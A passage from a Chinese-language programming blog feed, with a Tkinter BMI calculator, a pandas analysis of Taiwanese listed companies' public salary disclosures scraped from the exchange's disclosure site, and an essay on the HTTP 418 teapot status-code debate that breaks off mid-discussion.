import tkinter as tkimport mathwindow = tk.Tk()window.title(&#x27;BMI App&#x27;)window.geometry(&#x27;800x600&#x27;)window.configure(background=&#x27;white&#x27;)def calculate_bmi_number():    height = float(height_entry.get())    weight = float(weight_entry.get())    bmi_value = round(weight / math.pow(height, 2), 2)    result = &#x27;你的 BMI 指數為：&#123;&#125; &#123;&#125;&#x27;.format(bmi_value, get_bmi_status_description(bmi_value))    result_label.configure(text=result)def get_bmi_status_description(bmi_value):    if bmi_value &lt; 18.5:        return &#x27;體重過輕囉，多吃點！&#x27;    elif bmi_value &gt;= 18.5 and bmi_value &lt; 24:        return &#x27;體重剛剛好，繼續保持！&#x27;    elif bmi_value &gt;= 24 :        return &#x27;體重有點過重囉，少吃多運動！&#x27;header_label = tk.Label(window, text=&#x27;BMI 計算器&#x27;)header_label.pack()height_frame = tk.Frame(window)height_frame.pack(side=tk.TOP)height_label = tk.Label(height_frame, text=&#x27;身高（m）&#x27;)height_label.pack(side=tk.LEFT)height_entry = tk.Entry(height_frame)height_entry.pack(side=tk.LEFT)weight_frame = tk.Frame(window)weight_frame.pack(side=tk.TOP)weight_label = tk.Label(weight_frame, text=&#x27;體重（kg）&#x27;)weight_label.pack(side=tk.LEFT)weight_entry = tk.Entry(weight_frame)weight_entry.pack(side=tk.LEFT)result_label = tk.Label(window)result_label.pack()calculate_btn = tk.Button(window, text=&#x27;馬上計算&#x27;, command=calculate_bmi_number)calculate_btn.pack()window.mainloop()

最後成果：
總結以上透過 Python 內建的 Tkinter 函式庫來建立一個簡單的 BMI 計算應用程式，讓讀者感受一下 Python Tkinter 設計桌面應用程式的流程。事實上，Tkinter 支援物件導向撰寫方式，我們也可以將以上程式碼重構成物件導向撰寫方式。比起 CLI 來說 GUI 對於一般使用者在使用上確實是比較方便，若有興趣的讀者也可以自己嘗試製作小遊戲或是更多有趣的不同應用。
參考文件
tkinter — Python interface to Tcl&#x2F;Tk
Python 快速入門教學

關於作者@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>tkinter</tag>
        <tag>bmi</tag>
        <tag>gui</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Python 資料分析和視覺化上市櫃公司薪資公開資料</title>
    <url>/2019/07/26/how-to-use-taiwan-salary-data-to-do-python-data-analytics-and-data-visualization/</url>
    <content><![CDATA[
前言
證交所今（28）日在公開資訊觀測站公布上市公司申報之107年度「非擔任主管職務之全時員工薪資」資訊。藉由提升員工薪酬資訊透明度，讓摳門老闆無所遁形。

根據新聞媒體的報導 證交所公布上市公司非主管全時員工薪資，讓我們可以一窺近兩千家（853 + 733）上市櫃公司的薪資水準，也可以看看哪些公司薪資水準相對較低（順便看看各種逗趣的理由？本文 cover 圖即是將低薪公司的理由放入 wordcloud 產生器產生的圖片！），當作我們尋找合適工作的參考依據之一（但薪資高低不是決定合適工作的唯一標準）。
當然身為一個略懂略懂資料分析的軟體工程師，我們當然不能只看新聞媒體所提供的加工過的二手資料，更應該親自動手 hands on 來進行資料探索看看有哪些有趣的小 insight。因此接下來我們將使用 Python 網路爬蟲爬取證交所公開資訊觀測站上的上市櫃公司「非擔任主管職務之全時員工薪資」資訊並使用 python pandas、matplotlib 和 jupyter notebook 進行資料分析和資訊視覺化，看到更多有趣的薪水數據分析。
資料蒐集 Data Collect &#x2F; Data Scraping
正所謂巧婦難為無米之炊，資料分析難為沒 data！ 所以在決定要進行上市櫃公司的薪資資料後，我們必須蒐集相關的資料以利後續分析。
一開始我們先來到 證交所公開資訊觀測站 來觀察如何爬取非擔任主管職務之全時員工薪資資訊。

經過一番觀察後發現當下拉選單選擇時會使用 ajax 去後端 api 擷取資料。所以我們可以透過 POST https://mops.twse.com.tw/mops/web/ajax_t100sb15 這個 endpoint 去取得薪資資料。


由於資料集的欄位有合併的部分，所以我們拿掉 非擔任主管職務之全時員工資訊、同業公司資訊 和 薪資統計情形 讓 columns 可以更單純，以利於接下來使用 pandas 進行資料分析。
from collections import OrderedDictimport requestsimport pandas as pdfrom bs4 import BeautifulSoupclass HTMLTableParser:    def get_html_tables_from_resp(self, html_text):        soup = BeautifulSoup(html_text, &#x27;html.parser&#x27;)        tables = soup.find_all(&#x27;table&#x27;)        return tables    def parse_html_table(self, table):        &quot;&quot;&quot;        &lt;tr&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot; rowspan=&quot;2&quot;&gt;產業類別&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot; rowspan=&quot;2&quot;&gt;公司代號&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot; rowspan=&quot;2&quot;&gt;公司名稱&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; colspan=&quot;4&quot; nowrap=&quot;&quot;&gt;非擔任主管職務之&lt;br/&gt;全時員工資訊&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; colspan=&quot;2&quot; nowrap=&quot;&quot;&gt;同業公司資訊&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; colspan=&quot;4&quot; nowrap=&quot;&quot;&gt;薪資統計情形&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;員工薪資總額(仟元)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;員工人數-加權平均(人)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;員工薪資-平均數(仟元/人)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;每股盈餘(元/股)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;員工薪資-平均數(仟元/人)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;平均每股盈餘(元/股)&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;非經理人之&lt;br/&gt;全時員工薪資&lt;br/&gt;平均數未達50萬元&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;公司EPS獲利表現較同業為佳&lt;br/&gt;，惟非經理人之全時員工&lt;br/&gt;薪資平均數低於同業水準&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;公司EPS較前一年度成長&lt;br/&gt;，惟非經理人之全時員工&lt;br/&gt;薪資平均數較前一年度減少&lt;/th&gt;            &lt;th align=&quot;center&quot; class=&quot;tblHead&quot; nowrap=&quot;&quot;&gt;公司經營績效與員工薪酬&lt;br/&gt;之關聯性及合理性說明&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;資訊服務業&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;8416&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;實威&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt; 158,636 &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt; 186 &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt; 853 &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt; 9.69 &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt; 807 &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt; 1.20 &lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:right !important;&quot;&gt;&lt;/td&gt;            &lt;td nowrap=&quot;&quot; style=&quot;text-align:left !important;&quot;&gt;&lt;br/&gt;&lt;/td&gt;        &lt;/tr&gt;        &quot;&quot;&quot;        parsed_data = []        # Find number of rows and columns        # we also find the column titles if we can        table_row_tags = table.find_all(&#x27;tr&#x27;)        table_header_tags = table.find_all(&#x27;th&#x27;)        column_names = [table_header_tag.get_text() for key, table_header_tag in enumerate(table_header_tags) if key not in (3, 4, 5)]        column_names[7] = &#x27;同業公司&#123;&#125;&#x27;.format(column_names[7])        column_names[8] = &#x27;同業公司&#123;&#125;&#x27;.format(column_names[8])        tr_td_tags = [            [td_tag.get_text().strip() for td_tag in table_row.find_all(&#x27;td&#x27;)]            for table_row in table_row_tags if table_row.find_all(&#x27;td&#x27;)        ]        parsed_data = [            OrderedDict(&#123;                column_names[index]: td_tag                for index, td_tag in enumerate(tr_td_tag)            &#125;)            for tr_td_tag in tr_td_tags        ]        df = pd.DataFrame.from_dict(parsed_data)        return dfhtlm_parser = HTMLTableParser()payload = &#123;    # &#x27;encodeURIComponent&#x27;: 1,    &#x27;step&#x27;: 1,    &#x27;firstin&#x27;: 1,    &#x27;TYPEK&#x27;: &#x27;sii&#x27;, # sii 上市 / otc 上櫃    &#x27;RYEAR&#x27;: 107,    &#x27;code&#x27;: &#x27;&#x27;,&#125;headers = &#123;&#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#x27;&#125;resp = requests.post(&#x27;https://mops.twse.com.tw/mops/web/ajax_t100sb15&#x27;, data=payload, headers=headers, timeout=2)html_tables = htlm_parser.get_html_tables_from_resp(resp.text)df_table = htlm_parser.parse_html_table(html_tables[0])df_table.to_csv(&#x27;107_&#123;&#125;.csv&#x27;.format(payload[&#x27;TYPEK&#x27;]), index=False, encoding=&#x27;utf-8&#x27;)print(df_table)

資料前處理 Data Preprocessing資料前處理是資料探勘和資料分析流程步驟之一，主要目的是將真實世界的資料進行整理轉化，變得可以閱讀和分析。
在蒐集完資料後，我們將使用 pandas 載入我們抓取的上市櫃公司薪資的 .csv 檔案來進行分析 並進行資料前處理。我們蠻幸運的是這個資料集算是完整且是結構化資料，不太需要做太多的資料前處理（例如：補值、刪除遺漏值等），主要要做的是 columns 名稱調整和員工薪資值的取代和轉換成整數。
上市公司的 107_sii.csv 檔案：


上櫃公司的 107_otc.csv 檔案：


接著我們來進行資料的前處理，方便接下來的探索性資料分析，首先載入 pandas、matplotlib 函式庫並使用 pandas 載入資料集

import pandas as pdimport matplotlib.pyplot as pltdf_sii = pd.read_csv(&#x27;./107_sii.csv&#x27;)df_otc = pd.read_csv(&#x27;./107_otc.csv&#x27;)df_sii.shape# (853, 13) 共有 853 家上市公司資料，13 個欄位df_otc.shape# (733, 13) 共有 733 家上市公司資料，13 個欄位df_sii.index# RangeIndex(start=0, stop=853, step=1)df_sii.values&quot;&quot;&quot;array([[&#x27;水泥工業&#x27;, 1101, &#x27;台泥&#x27;, ..., nan, nan, nan],       [&#x27;水泥工業&#x27;, 1102, &#x27;亞泥&#x27;, ..., nan, nan, nan],       [&#x27;水泥工業&#x27;, 1103, &#x27;嘉泥&#x27;, ..., nan, nan, nan],       ...,       [&#x27;建材營造&#x27;, 9946, &#x27;三發地產&#x27;, ..., nan, nan, nan],       [&#x27;其他&#x27;, 9955, &#x27;佳龍&#x27;, ..., nan, nan, nan],       [&#x27;鋼鐵工業&#x27;, 9958, &#x27;世紀鋼構&#x27;, ..., nan, nan, nan]], dtype=object)&quot;&quot;&quot;df_sii.columns&quot;&quot;&quot;Index([&#x27;產業類別&#x27;, &#x27;公司代號&#x27;, &#x27;公司名稱&#x27;, &#x27;員工薪資總額(仟元)&#x27;, &#x27;員工人數-加權平均(人)&#x27;, &#x27;員工薪資-平均數(仟元/人)&#x27;,       &#x27;每股盈餘(元/股)&#x27;, &#x27;同業公司員工薪資-平均數(仟元/人)&#x27;, &#x27;同業公司平均每股盈餘(元/股)&#x27;,       &#x27;非經理人之全時員工薪資平均數未達50萬元&#x27;, &#x27;公司EPS獲利表現較同業為佳，惟非經理人之全時員工薪資平均數低於同業水準&#x27;,       &#x27;公司EPS較前一年度成長，惟非經理人之全時員工薪資平均數較前一年度減少&#x27;, &#x27;公司經營績效與員工薪酬之關聯性及合理性說明&#x27;],      dtype=&#x27;object&#x27;)&quot;&quot;

整體資料資訊：
df_sii.info()&lt;class &#x27;pandas.core.frame.DataFrame&#x27;&gt;RangeIndex: 853 entries, 0 to 852Data columns (total 13 columns):產業類別                                    853 non-null object公司代號                                    853 non-null int64公司名稱                                    853 non-null object員工薪資總額(仟元)                              853 non-null object員工人數-加權平均(人)                            853 non-null object員工薪資-平均數(仟元/人)                          853 non-null object每股盈餘(元/股)                               853 non-null float64同業公司員工薪資-平均數(仟元/人)                      853 non-null object同業公司平均每股盈餘(元/股)                         853 non-null float64非經理人之全時員工薪資平均數未達50萬元                    66 non-null object公司EPS獲利表現較同業為佳，惟非經理人之全時員工薪資平均數低於同業水準    142 non-null object公司EPS較前一年度成長，惟非經理人之全時員工薪資平均數較前一年度減少     0 non-null float64公司經營績效與員工薪酬之關聯性及合理性說明                   207 non-null objectdtypes: float64(3), int64(1), object(9)memory usage: 86.7+ KB

觀看前面幾筆資料長相：
$ df_sii.head()


將 columns 名稱調整成英文，方便分析操作
headers = [&#x27;industry&#x27;,&#x27;company_code&#x27;, &#x27;company_people_count&#x27;, &#x27;company_name&#x27;, &#x27;company_total_salary&#x27;, &#x27;company_average_salary&#x27;, &#x27;company_eps&#x27;, &#x27;industry_average_salary&#x27;, &#x27;industry_average_eps&#x27;, &#x27;is_under_50&#x27;, &#x27;high_eps_low_salary&#x27;, &#x27;growth_but_low_salary&#x27;, &#x27;low_salary_reason&#x27;]df_sii.columns = headersdf_otc.columns = headersdf_sii.columnsIndex([&#x27;industry&#x27;, &#x27;company_code&#x27;, &#x27;company_name&#x27;, &#x27;company_people_count&#x27;,       &#x27;company_total_salary&#x27;, &#x27;company_average_salary&#x27;, &#x27;company_eps&#x27;,       &#x27;industry_average_salary&#x27;, &#x27;industry_average_eps&#x27;, &#x27;is_under_50&#x27;,       &#x27;high_eps_low_salary&#x27;, &#x27;growth_but_low_salary&#x27;, &#x27;low_salary_reason&#x27;],      dtype=&#x27;object&#x27;)

調整 column 過後：
df_sii.info()&lt;class &#x27;pandas.core.frame.DataFrame&#x27;&gt;RangeIndex: 853 entries, 0 to 852Data columns (total 13 columns):industry                   853 non-null objectcompany_code               853 non-null int64company_name               853 non-null objectcompany_total_salary       853 non-null objectcompany_people_count       853 non-null objectcompany_average_salary     853 non-null int64company_eps                853 non-null float64industry_average_salary    853 non-null objectindustry_average_eps       853 non-null float64is_under_50                66 non-null objecthigh_eps_low_salary        142 non-null objectgrowth_but_low_salary      0 non-null float64low_salary_reason          207 non-null objectdtypes: float64(3), int64(2), object(8)memory usage: 86.7+ KB

將員工薪資-平均數(仟元&#x2F;人) , 去除並將字串 str 轉為 float
df_sii[&#x27;company_average_salary&#x27;] = df_sii[&#x27;company_average_salary&#x27;].str.replace(&#x27;,&#x27;, &#x27;&#x27;).astype(int)df_otc[&#x27;company_average_salary&#x27;] = df_otc[&#x27;company_average_salary&#x27;].str.replace(&#x27;,&#x27;, &#x27;&#x27;).astype(int)

新的資料長相：
df_sii.head()


探索性資料分析 Explore Data Analytics探索性資料分析是資料分析的一個步驟，透過敘述統計、圖表分析等方式來了解資料（例如：最大、最小值、平均值、標準差、離群值等），找出假設和可能的特徵值。
在進行完資料前處理後我們要來進行探索性資料分析，看看有哪些有趣的資料組合、相關性和圖表。

首先我們來看看一些基本的敘述統計：
 df_sii.describe()

 
 喔喔，853 家上是公司平均薪資達 82 萬，挺不錯的呀！但記得這是平均數（首富跟你的平均）。EPS 平均有 2.73 左右。來看看薪資排名：
 df_sii.sort_values([&#x27;company_average_salary&#x27;], ascending=False)

 最大值當然就是媒體爭相報導的發哥聯發科的 270 萬，郭董事長的鴻海也是榜上有名啦，當然我們台灣之光台積電也是名列前茅（讓人肅然起敬的還是台積電員工數量也是相當多）：
 
 最小值則是食品公司興泰的 34 萬（嗯，月薪約 NT 28,500，比 22k 好一點）
 df_sii.sort_values([&#x27;company_average_salary&#x27;], ascending=True)

 
 去台灣股市資訊網 弄來的台灣前 20 大市值公司名單：
 top20_valuable_stock_list = [2330, 2317, 6505, 2412, 1301, 3008, 1303, 1326, 2882, 2454, 1216, 2881, 2886, 2891, 2308, 2002, 3045, 2912, 3711, 2892]df_sii[df_sii[&#x27;company_code&#x27;].isin(top20_valuable_stock_list)]

 嗯，看來公司市值比較高，薪水不一定比較高。
 台股前二十大市值公司薪資排行：聯發科、鴻海、台積電、中鋼、中華電、台達電、兆豐金、台塑石化、台塑、台化 &lt;&#x3D; 抓到了，公司市值大薪資又高的公司！讀者準備 CV 中（大誤）
 
 最後來關心一下，咱們網路軟體業的薪資水平好了。若以純網路軟體可以看一下目前獨立出來的上市櫃公司的電子商務類別：
 df_otc[df_otc[&#x27;industry&#x27;].isin([&#x27;電子商務&#x27;])].sort_values([&#x27;company_average_salary&#x27;], ascending=False)

 好吧，革命尚未成功，同志仍需努力。台灣半導體、電子業還是很強，網路軟體業還是得加點油。
 
 df_otc_ec = df_otc[df_otc[&#x27;industry&#x27;].isin([&#x27;電子商務&#x27;])]df_otc_ec.company_average_salary = pd.to_numeric(df_otc_ec.company_average_salary)df_otc_ec.loc[:, [&#x27;company_code&#x27;, &#x27;company_average_salary&#x27;]].plot(kind=&#x27;bar&#x27;, x=&#x27;company_code&#x27;, y=&#x27;company_average_salary&#x27;, title =&quot;TW EC&quot;, figsize=(15, 10), legend=True, fontsize=12)
 

EPS 和 薪資的相關性： 接著我們想了解公司賺錢是否有合理分配到員工身上，因為依照正常的邏輯假設來講，公司賺錢（這邊簡單用 EPS 每股盈餘來看，稅後 EPS &#x3D; 淨利&#x2F;在外流通股數），應該員工的薪資會相對較高，但真的是這樣嗎？
 在畫散佈圖之前，我們先把 dataFrame 取子集合（僅含公司平均薪資和公司 eps）
 df_sii_average_salary_eps = df_sii[[&#x27;company_average_salary&#x27;, &#x27;company_eps&#x27;]]

 sort 發現有 大立光、國巨、華新科 index [488, 252, 372] 這幾個 eps 超高的 outliner，簡單起見先把它們去除：
 df_sii_average_salary_eps.sort_values([&#x27;company_eps&#x27;], ascending=False)

 
 filter_df_sii_average_salary_eps = df_sii_average_salary_eps.drop(df_sii_average_salary_eps.index[[488, 252, 372]])filter_df_sii_average_salary_eps.sort_values([&#x27;company_eps&#x27;], ascending=False)

 看起來正常多了：
 
 將 company_eps 當作 x 軸，company_average_salary 當 y 軸畫出 scatter，看起來大部分公司 eps 都在 0-10 之間，但 eps 和薪資相關性看起來沒辦法很確定是否相關：
 filter_df_sii_average_salary_eps.plot(kind=&#x27;scatter&#x27;, x=&#x27;company_eps&#x27;, y=&#x27;company_average_salary&#x27;)

 
 使用 Pearson correlation coefficient 來看看 eps 和薪資的相關程度：

皮爾森相關分析用於探討兩連續變數 (X, Y) 之間的線性相關性，若兩變數之間的相關係數絕對值較大，則表示彼此相互共變的程度較大。一般而言，若兩變數之間為正相關，則當 X 提升時，Y 也會隨之提升；反之，若兩變數之間為負相關，則當 X 提升時，Y 也會隨之下降。一般研究學者認為，相關係數 0.3 以下為低相關，0.3-0.7 為中等相關，0.7 以上為高度相關。

 filter_df_sii_average_salary_eps.corr(method =&#x27;pearson&#x27;)

 
 結果是 0.307071。所以台灣上市公司 eps 和公司薪資應該可以算是中等相關，也就是說公司賺錢和你賺不賺錢不一定高度相關，還要看老闆產業和老闆摳不摳門呀！

公司經營績效與員工薪酬之關聯性及合理性說明： 這次證交所公布的公開資料蠻有趣的，特別要求若是屬於低薪的公司需要公布低薪理由。若有興趣的讀者可以研究看看，可以拓展視野，開了不少眼界XD，也更加印證了：
 高薪的理由只有一個（產業、公司賺錢發大財），低薪的理由卻可以有很多種。

本公司地處偏鄉，人才要求不易致外籍員工人數較高拉低平均薪資，且對個人的學經歷及技能要求無法提高，僅能於就職過程中予以訓練及培養，雖無法達到規定金額仍盡力提高員工所得。

 為何外籍員工只能低薪？可以雇用高級技術員工？

1.全球經濟不景氣2.過度教育讓學歷貶值、同儕效應使薪資過低3.外勞人數多，拉低平均薪資4.派遣員工的比例高，拉低對員工平均薪資的成長

 過度教育讓學歷貶值？全球經濟不景氣？（千錯萬錯都是別人的錯？黑人問號？）

因總公司座落在「新竹科學園區」外，相較薪資水準與園區內的同業較低。且公司大部份員工是在地居民，所以薪資福利項目屬於外縣市之交通、住宿補助福利較少。

 新竹科學園區 OS：低薪怪我囉～


總結以上我們透過簡單使用 Python 資料分析和視覺化上市櫃公司薪水公開資料，進行資料分析的步驟：

資料蒐集 Data Collect &#x2F; Data Scraping
資料前處理 Data Preprocessing
探索性資料分析 Explore Data Analytics

主要是透過一個難得的公開資料集進行簡單的資料分析（政府部門德政應該好好的鼓勵一下，也期許自己未來有機會也不要成為員工口中的慣老闆？）。未來我們也可以更進一步整合更多資料集來進行選股、公司低薪理由文字分析或是分析各區域的薪資地圖等更多有趣的資料分析應用。我們下回見啦！
參考文件
證交所公布本國上市公司107年度非擔任主管職務之全時員工薪資資訊
台灣公司總市值
皮爾森積差相關分析(Pearson Correlation)-說明與SPSS操作

（image via twimg、topjavatutorial、Hacker Noon
）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Data Analytics</tag>
        <tag>Data Visualization</tag>
        <tag>make a fortune</tag>
        <tag>pandas</tag>
        <tag>上市櫃薪資資料</tag>
        <tag>公開資訊觀測站</tag>
        <tag>台灣薪資</tag>
        <tag>台灣薪水</tag>
        <tag>salary</tag>
        <tag>python 資料分析</tag>
        <tag>python 資料視覺化</tag>
      </tags>
  </entry>
  <entry>
    <title>搶救茶壺大作戰：418 I am a teapot</title>
    <url>/2019/06/15/iam-a-teapot-418/</url>
    <content><![CDATA[前言有許多的 HTTP Status Code 大家都耳熟能詳，例如說 404 Not Found、500 Internal Server Error 以及 200 OK 等等。
在眾多的狀態碼之中，有一個擺明就是來搞笑的：418 I’m a teapot。
但你知道嗎，它不在 HTTP 標準裡面，所以根本不是標準的 HTTP 狀態碼。你可能會想說：「我都看過 RFC 了，怎麼會不是？」。但那份 RFC 也跟 HTTP 一點關係都沒有，不過滿多人都沒注意到這點。
我一開始也沒注意到這件事，以為 418 是 HTTP 標準的其中一部分，一直到 2017 年 8 月時有人在 Node.js 的 GitHub 發了一個 Issue：418 I’m A Teapot 我才注意到。
Issue 裡面提到希望能移除對 418 的 support，而發起 Issue 的作者在被人告知 Go 也這樣搞的時候，也跑去 Go 發了一個 Issue。
那時候這起要求移除 418 狀態碼的事件其實引發了不小的風波，而大部分人其實是反對移除這個狀態碼的。甚至還有人做了一個 save418.com，想要拯救 418。
前陣子花了點時間研究一下整件事情的來龍去脈，在整理的過程中也發現無論贊成或是反對，這其中的理由都很值得我們去思考，因此在此總結成一篇文章跟大家分享。
418 的由來418 的由來可以追溯到 1998 年 4 月 1 日愚人節的這一份文件：RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0)，HTCPCP 是 Hyper Text Coffee Pot Control Protocol 的簡稱，總之這份 RFC 描述了一個叫做 HTCPCP 的協定，建立在 HTTP 之上，並且可以利用這個協定來泡咖啡。
講到 418 的部分在 Section 2.3.2：

2.3.2 418 I’m a teapot


  Any attempt to brew coffee with a teapot should result in the error   code “418 I’m a teapot”. The resulting entity body MAY be short and   stout.

大意就是如果有人想用茶壺來泡咖啡，你應該回個它一個 418 的狀態碼，我是個茶壺，你幹嘛拿我來泡咖啡？
這邊值得注意的只有一件事，那就是 418 是在 HTCPCP 這個協定裡面，並不是 HTTP。所以 418 並不是 HTTP 協定的標準狀態碼。
移除 418 的風波在 2017 年 8 月 5 日，Mark Nottingham 在 Node.js 的 GitHub 發了這樣的一個 Issue：

Node implements the 418 I’m a Teapot status code in a few places.


Its source is RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0). Note the title - HTCPCP&#x2F;1.0 is not HTTP&#x2F;1.x.


HTCPCP was an April 1 joke by Larry to illustrate how people were abusing HTTP in various ways. Ironically, it’s not being used to abuse HTTP itself – people are implementing parts of HTCPCP in their HTTP stacks.


In particular, Node’s support for the HTCPCP 418 I’m a Teapot status code has been used as an argument in the HTTP Working Group to preclude use of 418 in HTTP for real-world purposes.


While we have a number of spare 4xx HTTP status codes that are unregistered now, the semantics of HTTP are something that (hopefully) are going to last for a long time, so one day we may need this code point.


Please consider removing support for 418 from Node, since it’s not a HTTP status code (even by its own definition). I know it’s amusing, I know that a few people have knocked up implementations for fun, but it shouldn’t pollute the core protocol; folks can extend Node easily enough if they want to play with non-standard semantics.


Thanks,

裡面請求 Node 把 418 的支援移除，理由是 418 並不是 HTTP 標準的狀態碼，而且 4xx 的狀態碼雖然還有很多，但若是我們希望 HTTP 能盡量活得長久，我們終究有一天需要用到這個狀態碼的。
底下引起了一番討論之後，有人指出 Go 也實作了 418，因此 Mark Nottingham 就跑到了 Go 的 GitHub 去，也發了一個相似的 Issue：net&#x2F;http: remove support for status code 418 I’m a Teapot。
這兩個 Issue 其實都很值得一看，裡面有許多很有建設性的討論。下面我整理幾個支持與反對的論點。
反對移除：418 是無害的
418 是個無害的彩蛋，而且很有趣，離我家的 418 遠一點！

我覺得這論點滿無力的，只要證明 418 其實是有害的就好。
支持移除：萬一以後有人要用 418 怎麼辦？
你說 418 無害，不對啊，如果我們希望 HTTP 能活得久，那遲早會有 418 會需要被用到的一天，到那天他就是別的意思了。就算你把 418 保留起來，也是少了一個狀態碼可以用

這一點我覺得滿有趣的。的確，照這種說法 418 佔了一個位置，以後能用的狀態碼就少了一個。但問題是這「一個」重要嗎？可以搭配下面的反對論點一起看。
反對移除：418 只佔了一個空間，問題不在 418如果 4xx 都快用完的那天真的來臨了，該檢討的是 HTTP 的設計，還是檢討狀態碼不夠用？如果真的只剩一個可以用，是不是代表還有更大的問題該解決？
之所以這點我覺得很有趣，是因為這跟我們平時在寫程式會碰到的問題滿像的。有時候你會擔心自己是不是過早最佳化（Premature Optimization）或是過度工程化（Over Engineering），做了完全不需要用到的優化。

假設今天有一個程式，用 1~100 這 100 個數字來表示不同狀態。隨著時間我們會需要不同的數字來表示不同狀態，所以能用的數字會愈來愈少，而我們又希望這程式能夠活得長久。在這種情況下，你贊成我們拿其中一個數字來當彩蛋嗎？

如果你反對，認為每一個數字都很重要，不該隨意拿一個數字出來當彩蛋，就代表你認為 418 是該被移除的。
但我自己對這題的看法是一個數字根本無關緊要。
理由是，若是你真的把 99 個數字用完了，就算我拿去當彩蛋的數字還你，你依然在不久後會用完所有的數字。到那個時候，你還是需要找新的解法。所以只差一個數字根本差不了多少。
支持移除：418 不在 HTTP 標準內這是我覺得最有力的論點。
大家都知道 418 是個彩蛋，也知道它很有趣，可是它終究不是 HTTP 標準的一部分。今天你如果要實作一個「遵循 HTTP 標準」的程式，你就不應該把 418 放進去，因為它不在裡面。在 IANA 裡面 418 也是 Unassigned 的狀態。
如果你今天是市井小民，想要在自己家的伺服器或是 App 裡面實作 418，那沒有人會干擾你。但對於 Node.js、Go 這種專案來說，就應該遵守規範來開發。
這點也可以延伸到平常開發產品時會碰到的問題。如果 PM 規格寫不清楚，工程師要嘛自己通靈，要嘛就叫 PM 把模糊的地方寫清楚一點，最好是不要有任何個人的解釋空間，越清楚越好。
當今天 PM 把規格書寫得超級清楚，工程師卻自己偷偷加了一個額外的彩蛋，這是合理的嗎？這彩蛋可能無關緊要，可能只有工程師自己知道怎麼打開，但無論如何還是超出了規格之外。
在思考 418 的去留問題時，你可能只看見 418。但我認為你在碰到 418 問題時所做出的選擇，都跟你平時開發會碰到的問題有關。而且有趣的是，你有可能在 418 時選了 A，卻在類似的開發問題上選了 B，兩者是互相衝突的。
以我個人的立場來說，418 不在標準內這個理由很有力。不過以情感上來說我是不希望它被移除的，幸好還有一個反對的論點也滿有力的。
反對移除：418 已經被誤用太久了在做版本更新時，有一個很重要的點是要維持向下相容（backward compatible），如果不是什麼太重要的事，盡量不要有 breaking change。
而這個論點講的是 418 作為一個「被誤認為是 HTTP 標準」的狀態碼已經十幾年了，所以每一個主流的函式庫幾乎都有支援 418（你看 Node.js 跟 Go 都有支援），若是今天把 418 的支援拔掉了，那以前使用到 418 的 Server 怎麼辦？  
這論點我也覺得滿有力的，418 已經被誤用太久，拔掉之後會產生的問題似乎比維持現狀還要多。從這點來看，它是不該被移除的。
418 的後續發展及現況當初 Mark Nottingham 發表了希望移除 418 的 Issue 之後，有些人覺得他是來鬧的，吃飽太閒才會把想法動到 418 身上去。
但如果你點進他的 GitHub，可以看到他的自我介紹：

I work on HTTP specifications and implementations.

他原本就參與了各個跟 HTTP 標準相關的組織，而且在這個領域做了不少的貢獻。
在社群掀起了反對聲浪以後，他也決定從原本的移除 418 轉變為保留 418 的立場：

